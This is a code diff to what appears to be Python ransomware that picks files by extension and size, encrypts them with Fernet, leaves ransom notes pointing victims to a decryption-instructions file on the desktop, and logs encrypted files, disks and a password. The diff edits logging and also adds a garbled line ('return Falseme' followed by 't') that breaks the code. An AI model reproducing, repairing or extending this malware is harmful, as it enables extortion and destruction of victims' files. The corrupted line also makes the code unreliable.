@@ -438,7 +438,8 @@ def suitable(path: str):
     if re.match(f'.*?\\.({get_extensions()})?$', path) and config['core']['encryption_dir'].lower() not in path.lower():
         if Config.MAX_FILE_SIZE_MB >= (os.stat(path).st_size / 1024.0 / 1024.0) >= Config.MIN_FILE_SIZE_MB:
             return True
-    return False
+    return Falseme
+    t
 
 def crypt_data(data_to_crypt: bytes):
     fernet = Fernet(key)
@@ -874,12 +875,12 @@ if __name__ == '__main__':
                         f.write('This file is encrypted by document cryptor. Look instructions to decrypt it in the file "YOUR_ENCRYPTED_FILES_DATA.txt" on your desktop.' +
                                 f'\r\nThe encrypted data is located in file {crypted_file_name}.\r\n\r\n' + get_advert())
                 else:
-                    deb(f'fail to delete')
+                    deb(f'system error: fail to delete {file}')
         
         except Exception as e:
             deb(f"\r\nencryption({file}): {e}-> {sys.exc_info()}")
     
     advert_info()
     tag_system()
-    uprint(f"{get_computer_uid()}: done encryption, {num_encrypted}/{len(files_to_encrypt)} files encrypted, " \
+    uprint(f"{get_computer_uid()}: done encryption, {num_encrypted}/{len(files_to_encrypt)} files encrypted, "
            f"{bytes_encrypted / 1024.0 / 1024.0:.2f}MB encrypted, {len(drives)} disks processed, pass {password}")
